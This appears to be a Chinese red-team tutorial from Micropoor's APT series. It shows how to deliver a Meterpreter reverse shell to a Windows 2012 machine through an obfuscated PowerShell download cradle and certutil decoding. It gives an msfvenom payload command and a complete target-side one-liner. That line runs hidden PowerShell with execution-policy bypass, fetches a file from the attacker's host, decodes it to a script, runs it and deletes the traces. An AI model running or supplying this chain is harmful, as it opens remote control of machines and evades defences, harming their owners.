专注APT攻击与防御
https://micropoor.blogspot.com/

第八季中提到了certutil的加密与解密。
`C:\>certutil -encode c:\downfile.vbs downfile.bat`，而配合powershell的内存加载，则可把certutil发挥更强大。

**靶机：windows 2012**

而今天需要的是一款powershell的混淆框架的配合
https://github.com/danielbohannon/Invoke-CradleCrafter

使用方法：
```
Import-Module ./Invoke-CradleCrafter.psd1 Invoke-CradleCrafter
```
![](media/c62807cec766f0f6c92c2d821cd6ede3.jpg)

![](media/5fd8400f05ad1fe156649bb7d4ab2726.jpg)

如果在加载powershell 脚本的时候提示：**powershell
进行数字签运行该脚本。**
则先执行：`set-executionpolicy Bypass`

生成payload：（有关生成payload，会在未来的系列中讲到）

`root@John:/tmp# msfvenom ‐p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐e cmd/powershell_base64 ‐f psh ‐o Micropoor.txt`

![](media/316a532d526b20050d34d02f8f06e952.jpg)

![](media/cfa22fb95c6b008829035e91928f47db.jpg)

**启动apache：**
![](media/d34911ee8f5ed23aaef4fe39846d7c4d.jpg)

**powershell框架设置：**

SET URL http://192.168.1.5/Micropoor.txt
![](media/bc3142653214ae8fd411b32efcdb77a8.jpg)

**MEMORY**
![](media/62d726b8feae58ada003965ac15cfe4a.jpg)

**CERTUTIL**
![](media/b700f3bfebafc44073df52b62d79d73c.jpg)

**ALL**
![](media/9b29ae29a5bf7fd27b9ded5b889844c4.jpg)

**1**
![](media/f14a65e3707c230527b14312400969e0.jpg)

**混淆内容保存txt，后进行encode**
![](media/17b242fcc60d1fa5eb54d8f2c6268331.jpg)

把cer.cer 与Micropoo.txt 放置同一目录下。
**目标机执行：**
```
powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString('http://192.168.1.5/cer.cer'); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cer.cer
```

>   Micropoor
